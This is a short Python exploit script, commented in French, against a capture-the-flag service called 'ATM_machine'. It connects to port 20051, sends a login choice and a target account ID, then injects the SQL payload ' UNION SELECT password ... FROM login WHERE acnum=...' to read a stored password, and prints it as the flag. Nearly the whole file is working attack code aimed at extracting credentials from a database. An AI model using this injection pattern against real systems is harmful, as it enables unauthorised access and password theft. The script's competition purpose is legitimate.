#!/usr/bin/python
# -*- coding: utf-8 -*-

# Exploit du service ATM_machine
import sys, socket
import time

if len(sys.argv) != 3 :
    print("Exploit du service ATM_machine\n\nUsage : " +  __file__ + " [hostname] [target]\n[target] est l'ID du flag de la team participant au CTF");
    exit();

host = sys.argv[1]
target = sys.argv[2]
port = 20051

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

try :
  time.sleep(0.1)
  login_ack = s.recv(1024)
  s.send('1\n')

  time.sleep(0.1)
  login_ack = s.recv(1024)
  s.send(target+'\n')

  time.sleep(0.1)
  flagid_ack = s.recv(1024)
  s.send("' UNION SELECT password, password, password FROM login WHERE acnum='"+target+"\n")

  cash_balance = s.recv(1024)
  if len(cash_balance.split()) == 4 :
    print((cash_balance.split())[3])
  s.close()

except socket.error:
  print("Erreur lors de l'envoi")
  sys.exit()
